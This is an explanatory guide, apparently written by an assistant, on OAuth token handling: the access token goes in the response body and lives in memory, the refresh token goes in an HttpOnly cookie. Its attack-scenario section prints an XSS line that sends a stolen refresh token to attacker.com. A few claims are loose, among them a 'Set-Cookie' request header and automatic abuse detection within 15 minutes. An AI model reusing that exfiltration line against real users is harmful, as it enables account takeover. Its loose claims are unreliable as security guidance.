# Where Are Access Token and Refresh Token Sent? Storage Location Clarification

## Your Critical Question

```
After OAuth authentication:

Access token: 
  ├─ Sent to UI? YES
  ├─ Stored where? Memory (frontend)
  └─ Used how? In Authorization header

Refresh token:
  ├─ Sent to UI? ???
  ├─ Stored where? Backend or UI?
  └─ How does UI use it if stored in backend?

This is the confusion!
```

**Let me clarify the EXACT flow of both tokens.**

---

## The Complete Flow: Both Tokens

### Step 1: OAuth Callback - Backend Exchanges Code

```
┌──────────────────────────────────────┐
│ Frontend (Browser)                   │
│                                      │
│ POST /api/auth/callback              │
│ {code: "abc123"}                     │
└──────────────────────────────────────┘
                ↓
┌──────────────────────────────────────┐
│ Backend (Node.js Server)             │
│                                      │
│ 1. Receives code from frontend       │
│                                      │
│ 2. Exchanges code with Google:       │
│    POST google.com/token             │
│    {                                 │
│      code: "abc123",                 │
│      client_secret: "SECRET_KEY"     │
│    }                                 │
│                                      │
│ 3. Google responds:                  │
│    {                                 │
│      access_token: "eyJhbGc...",     │
│      refresh_token: "1//0gZ...",     │
│      expires_in: 3600                │
│    }                                 │
│                                      │
│ 4. Backend now has BOTH tokens       │
│    in memory/database                │
└──────────────────────────────────────┘
```

### Step 2: Backend Returns Tokens to Frontend

```
Backend constructs response:

HTTP/1.1 200 OK
Set-Cookie: refresh_token=1//0gZ...; HttpOnly; Secure; SameSite=Strict
Content-Type: application/json

{
  "accessToken": "eyJhbGc...",
  "expiresIn": 300,        // 5 minutes (shorter copy for UI)
  "user": {
    "id": "user123",
    "email": "user@gmail.com"
  }
}
```

**What just happened:**

```
Access Token:
  ├─ IN RESPONSE BODY (visible to JS)
  ├─ Frontend receives it
  ├─ Frontend stores in MEMORY
  └─ Frontend uses it for API calls

Refresh Token:
  ├─ IN SET-COOKIE HEADER (NOT visible to JS)
  ├─ Browser automatically stores as HttpOnly cookie
  ├─ Frontend CANNOT access it with JavaScript
  ├─ Frontend CANNOT see it
  ├─ Frontend CANNOT read it
  └─ But browser automatically includes it in requests
```

---

## The KEY Difference: Two Different Tokens in Two Different Places

### Access Token Flow

```
┌─────────────────────────────────┐
│ Backend Response                │
│                                 │
│ {                               │
│   "accessToken": "eyJhbGc...",  │ ← IN RESPONSE BODY
│   "expiresIn": 300              │
│ }                               │
└─────────────────────────────────┘
        ↓
┌─────────────────────────────────┐
│ Frontend (Browser)              │
│                                 │
│ Receives response               │
│ Reads JSON:                     │
│   accessToken = "eyJhbGc..."    │
│                                 │
│ Stores in MEMORY:               │
│   let token = "eyJhbGc..."      │
│                                 │
│ Uses in API calls:              │
│   GET /api/user                 │
│   Authorization: Bearer eyJ...  │
│                                 │
└─────────────────────────────────┘
```

### Refresh Token Flow

```
┌──────────────────────────────────────┐
│ Backend Response                     │
│                                      │
│ Set-Cookie header:                   │
│ refresh_token=1//0gZ...;             │
│   HttpOnly                ← CRITICAL │
│   Secure                  ← CRITICAL │
│   SameSite=Strict         ← CRITICAL │
│                                      │
│ (NOT in response body)               │
└──────────────────────────────────────┘
        ↓
┌──────────────────────────────────────┐
│ Browser (Automatic)                  │
│                                      │
│ Receives Set-Cookie header           │
│                                      │
│ Browser stores:                      │
│   Cookies database (encrypted)       │
│   NOT in JavaScript memory           │
│   NOT accessible to JavaScript       │
│                                      │
│ Frontend JavaScript:                 │
│   document.cookie ← Can't see it     │
│   localStorage.getItem(...) ← Nope   │
│   sessionStorage ← Nope              │
│   axios.get(...) → Browser auto-     │
│   includes cookie! ← YES             │
│                                      │
└──────────────────────────────────────┘
```

---

## The Detailed Answer to Your Question

### Access Token: YES, Sent to UI, Stored in Memory

```
Access Token: eyJhbGc...

Step 1: Backend creates it
  ├─ Backend has: Long-lived token (1 hour from Google)
  ├─ Backend shortens it: Issues shorter copy (5 minutes)
  └─ Or just sends same token with shorter lifetime metadata

Step 2: Backend sends to UI in response body
  HTTP/1.1 200 OK
  Content-Type: application/json
  
  {
    "accessToken": "eyJhbGc...",  ← VISIBLE in JSON
    "expiresIn": 300
  }

Step 3: Frontend receives and parses
  const data = await response.json();
  const token = data.accessToken;  // "eyJhbGc..."

Step 4: Frontend stores in memory
  let accessToken = token;  // Stored in RAM, not on disk

Step 5: Frontend uses for API calls
  fetch('/api/user', {
    headers: {
      'Authorization': `Bearer ${accessToken}`
    }
  });

Step 6: Token expires
  ├─ After 5-15 minutes
  ├─ Frontend makes request
  ├─ Server returns 401
  ├─ Frontend knows to refresh
  └─ See below...
```

### Refresh Token: NO, NOT Sent to UI as JSON, Sent as HttpOnly Cookie

```
Refresh Token: 1//0gZ...

Step 1: Backend creates it
  ├─ Backend has: Long-lived token from Google (6 months)
  └─ Backend stores it securely

Step 2: Backend sends as HttpOnly cookie (NOT in JSON body)
  HTTP/1.1 200 OK
  Set-Cookie: refresh_token=1//0gZ...; HttpOnly; Secure; SameSite=Strict
  Content-Type: application/json
  
  {
    "accessToken": "eyJhbGc..."  ← This goes to JS
    // refresh_token NOT here
  }

Step 3: Browser receives Set-Cookie header
  ├─ Browser automatically processes it
  ├─ Stores in browser's cookie database
  ├─ NOT in JavaScript memory
  ├─ NOT visible to JavaScript
  └─ HttpOnly flag prevents JS access

Step 4: Frontend JavaScript tries to access
  document.cookie  
  // Output: "" (empty, HttpOnly cookies hidden)
  
  localStorage.getItem('refresh_token')
  // Output: null (not stored here)
  
  const cookie = document.cookie
  // Can't see refresh_token (HttpOnly)

Step 5: But browser AUTOMATICALLY includes it in requests
  fetch('/api/auth/refresh', {
    credentials: 'include'  // Include cookies
  });
  
  // Browser automatically adds:
  // Cookie: refresh_token=1//0gZ... (from HttpOnly cookie)
  
  // JavaScript doesn't see it being added
  // But backend receives it

Step 6: Backend receives refresh request
  // Cookie header contains: refresh_token=1//0gZ...
  // Even though JS can't see it
  // Browser added it automatically

Step 7: Backend validates and issues new tokens
  ├─ Validates refresh_token
  ├─ Issues new access_token
  ├─ Sets new refresh_token cookie
  └─ Returns in same way
```

---

## Side-by-Side Comparison

### What Frontend (JavaScript) Receives

```
┌────────────────────────────────────────────────────┐
│ Response from Backend                              │
├────────────────────────────────────────────────────┤
│                                                    │
│ Response Body (JSON):                              │
│ {                                                  │
│   "accessToken": "eyJhbGc...",  ← Can access      │
│   "expiresIn": 300              ← Can access      │
│ }                                                  │
│                                                    │
│ Response Headers:                                  │
│ Set-Cookie: refresh_token=1//0gZ...; HttpOnly     │
│             ↑ Can't access                         │
│             ↑ Browser handles it                   │
│             ↑ Hidden from JavaScript              │
│                                                    │
└────────────────────────────────────────────────────┘

JavaScript code:
  const data = await response.json();
  
  // ✓ CAN see and use:
  const accessToken = data.accessToken;
  
  // ✗ CAN'T see:
  const refreshToken = ???  // Not in JSON
  const refreshToken = document.cookie  // Doesn't show it
  
  // But browser sends refresh_token automatically
  // In requests with credentials: 'include'
```

---

## Where Each Token Is Stored

### Access Token Storage

```
┌──────────────────────────────────────────────────┐
│ Frontend Memory (Browser Process RAM)            │
├──────────────────────────────────────────────────┤
│                                                  │
│ let accessToken = "eyJhbGc...";                  │
│                                                  │
│ ✓ Accessible to: JavaScript on the page         │
│ ✗ Accessible to: XSS on same page (yes, bad!)   │
│ ✓ Lost on: Page refresh                         │
│ ✓ Hidden from: Browser history, logs            │
│ ✗ Protected from: XSS (not really)              │
│ ✓ Protected from: localStorage theft            │
│ ✓ Protected from: Cookie theft (not a cookie)   │
│                                                  │
│ When used:                                       │
│   fetch('/api/user', {                           │
│     headers: {                                   │
│       'Authorization': `Bearer ${accessToken}`  │
│     }                                            │
│   });                                            │
│                                                  │
└──────────────────────────────────────────────────┘
```

### Refresh Token Storage

```
┌──────────────────────────────────────────────────┐
│ Browser's HttpOnly Cookie Storage                │
├──────────────────────────────────────────────────┤
│ Location: Browser-managed, encrypted database    │
│ Platform:                                        │
│  ├─ Chrome/Edge: Local Storage/Cookies.db        │
│  ├─ Firefox: profile/cookies.sqlite              │
│  └─ Safari: ~/Library/Cookies/                   │
│                                                  │
│ ✓ Accessible to: Browser automatically          │
│ ✗ Accessible to: JavaScript (NO! HttpOnly)      │
│ ✗ Lost on: Page refresh (stays in cookie)       │
│ ✓ Hidden from: Browser history (no URL)         │
│ ✓ Protected from: XSS (can't read it)           │
│ ✓ Protected from: localStorage theft (different) │
│ ✓ Protected from: localStorage XSS (different)   │
│ ✓ Encrypted: Yes (by OS/browser)                │
│                                                  │
│ When used (automatic):                           │
│   fetch('/api/auth/refresh', {                   │
│     credentials: 'include'                       │
│   });                                            │
│   // Browser automatically adds cookie!          │
│   // Cookie: refresh_token=1//0gZ...             │
│   // JS doesn't see it, but it's sent           │
│                                                  │
└──────────────────────────────────────────────────┘
```

---

## The Critical Distinction

### What Gets Sent to UI (Frontend)

```
In response body (visible to JavaScript):
  ✓ Access Token (short-lived, ~5-15 minutes)
  ✗ Refresh Token (NOT sent in body)

In Set-Cookie header (hidden from JavaScript):
  ✗ Access Token (not in cookie)
  ✓ Refresh Token (HttpOnly cookie, auto-included)
```

### Code Example: Complete Flow

```javascript
// ===== BACKEND SENDS BOTH =====

// Response to frontend after OAuth:
HTTP/1.1 200 OK
Set-Cookie: refresh_token=1//0gZ...; HttpOnly; Secure; SameSite=Strict
Content-Type: application/json

{
  "accessToken": "eyJhbGc...",
  "expiresIn": 300,
  "user": { "id": "123", "email": "user@gmail.com" }
}

// ===== FRONTEND RECEIVES =====

// JavaScript in browser:
const response = await fetch('/api/auth/callback', {
  method: 'POST',
  body: JSON.stringify({ code: 'abc123' })
});

const data = await response.json();

// What JS can see:
console.log(data.accessToken);  // "eyJhbGc..." ✓ VISIBLE
console.log(document.cookie);   // "" (empty) - refresh_token hidden ✗

// What happens to refresh_token:
// Browser automatically stored it in HttpOnly cookie
// Frontend can't see it, but it's there

// ===== FRONTEND STORES TOKENS =====

// Access token: Store in memory
let accessToken = data.accessToken;

// Refresh token: Already in cookie, can't access but that's OK
// Browser will automatically include it when needed

// ===== FRONTEND MAKES API CALLS =====

// With access token (visible in code):
fetch('/api/user', {
  headers: {
    'Authorization': `Bearer ${accessToken}`  // From memory
  }
});

// ===== TOKEN EXPIRES =====

// After 5-15 minutes, access token expires
// Next API request fails with 401

// ===== FRONTEND REFRESHES =====

const refreshResponse = await fetch('/api/auth/refresh', {
  method: 'POST',
  credentials: 'include'  // Include cookies!
  // Browser AUTOMATICALLY adds:
  // Cookie: refresh_token=1//0gZ...
  // Frontend doesn't see this happening
});

const newData = await refreshResponse.json();

// Get new access token
accessToken = newData.accessToken;

// New refresh_token in Set-Cookie header
// Browser automatically updates the cookie
```

---

## Why This Design?

### Access Token in Body (Visible to JS)

```
Why send in response body?
  ├─ Frontend needs to use it
  ├─ Frontend makes API requests
  ├─ Need to put in Authorization header
  ├─ Therefore: Must be in JavaScript memory
  └─ Therefore: Must be in response body (JSON)

Why short-lived (5-15 minutes)?
  ├─ It's in JavaScript memory
  ├─ XSS can steal it (if attack happens)
  ├─ So keep exposure window small
  ├─ Automatic refresh before expiry
  └─ User never sees expiration
```

### Refresh Token in Cookie (Hidden from JS)

```
Why send as HttpOnly cookie?
  ├─ Backend needs to use it
  ├─ Backend calls /api/auth/refresh
  ├─ Backend needs refresh_token
  ├─ Better to have browser auto-include
  ├─ Better to hide from JavaScript
  └─ Therefore: HttpOnly cookie

Why not in response body?
  ├─ If in body, JS could steal it
  ├─ If in localStorage, XSS steals it
  ├─ HttpOnly cookie can't be stolen by JS/XSS
  ├─ Safer location
  └─ Longer lifetime acceptable (6 months)

Why hidden from JavaScript?
  ├─ Limits XSS damage
  ├─ Even if XSS happens, can't read it
  ├─ Browser includes it automatically anyway
  ├─ No need for JS to handle it
  └─ Extra security layer
```

---

## Attack Scenarios: Why This Design Matters

### If Refresh Token Was in Response Body

```
Attack scenario:

Backend sends:
{
  "accessToken": "eyJhbGc...",
  "refreshToken": "1//0gZ..."  ← IN JSON (BAD!)
}

XSS attack:
const data = await response.json();
const refreshToken = data.refreshToken;  // XSS steals it!

fetch('https://attacker.com/steal', {
  body: JSON.stringify({
    refresh_token: refreshToken
  })
});

Damage:
  ✗ Attacker has refresh_token
  ✗ Can use it for 6 months
  ✗ Can impersonate user
  ✗ Complete account compromise

This is why it's NOT in response body!
```

### With HttpOnly Cookie (Current Design)

```
Same XSS attack:

const data = await response.json();
const refreshToken = data.refreshToken;  // undefined (not in JSON!)

const refreshToken = document.cookie;  // "" (empty, HttpOnly hidden)

const refreshToken = ???  // No way to get it from JS

Attacker can steal:
  ✓ Access token (15 min damage window)
  ✗ Refresh token (can't steal, HttpOnly)

After 15 minutes:
  ✓ Access token expires
  ✓ Backend detects abuse
  ✓ Revokes refresh token

Damage: LIMITED (15 minutes)

This is why it's in HttpOnly cookie!
```

---

## Summary Table

| Token | Sent To UI? | In Response Body? | In Cookie? | Visible to JS? | Storage | Usage |
|-------|---|---|---|---|---|---|
| **Access Token** | ✓ YES | ✓ YES (JSON) | ❌ NO | ✓ YES | Memory | API requests |
| **Refresh Token** | ✓ YES (as cookie) | ❌ NO | ✓ YES (HttpOnly) | ❌ NO | Browser cookie DB | Token refresh |

---

## The Final Answer to Your Question

```
"Is refresh token sent to UI or stored in backend?"

Answer: BOTH!

Sent to UI:
  ✓ Yes, sent as Set-Cookie header
  ✓ Browser receives it
  ✓ Browser stores in cookie database

NOT visible to UI (JavaScript):
  ✗ JavaScript can't read it
  ✗ JavaScript can't access it
  ✗ HttpOnly flag prevents access

Stored where:
  ✓ Backend: Keeps record for validation
  ✓ Browser: In HttpOnly cookie storage
  ✗ Frontend JS: Can't access it
  ✗ localStorage: Not there
  ✗ Memory: Not in JS memory

How frontend uses it:
  ✓ Doesn't explicitly use it
  ✓ Browser automatically includes in requests
  ✓ With credentials: 'include' in fetch
  ✓ Set-Cookie: refresh_token header sent automatically

Analogy:
  Access token: Gift card frontend holds and uses
  Refresh token: House key sealed in envelope
    ├─ Frontend can't open envelope (HttpOnly)
    ├─ But security guard (browser) uses it
    ├─ Automatically when needed
    └─ Without frontend knowing
```

---

## Visual Summary

```
┌─────────────────────────────────────────────────────────┐
│ OAuth Response from Backend                             │
├─────────────────────────────────────────────────────────┤
│                                                         │
│ Response Headers:                                       │
│ Set-Cookie: refresh_token=1//0gZ...; HttpOnly           │
│             ↑                        ↑                  │
│             Sent to browser          Hidden from JS     │
│                                                         │
│ Response Body (JSON):                                   │
│ {                                                       │
│   "accessToken": "eyJhbGc...",                          │
│   ↑                                                     │
│   Visible to JavaScript                                │
│ }                                                       │
│                                                         │
└─────────────────────────────────────────────────────────┘
        ↓                              ↓
┌──────────────────────────┐  ┌─────────────────────┐
│ Frontend (JavaScript)    │  │ Browser Cookie DB   │
│                          │  │                     │
│ let token = "eyJhbGc..." │  │ refresh_token=...   │
│                          │  │ (HttpOnly, encrypted)
│ Uses: Authorization      │  │                     │
│ header                   │  │ Auto-included in:   │
│                          │  │ fetch(url, {        │
│ Lost on refresh          │  │   credentials:      │
│                          │  │   'include'         │
│                          │  │ })                  │
│                          │  │                     │
│ Short-lived              │  │ Long-lived          │
│ (5-15 min)               │  │ (6 months)          │
│                          │  │                     │
│ XSS can steal ✗          │  │ XSS can't steal ✓   │
│                          │  │                     │
└──────────────────────────┘  └─────────────────────┘
```

This is the complete architecture. Both tokens are sent to the browser, but they're sent in different ways and stored in different places for security reasons.
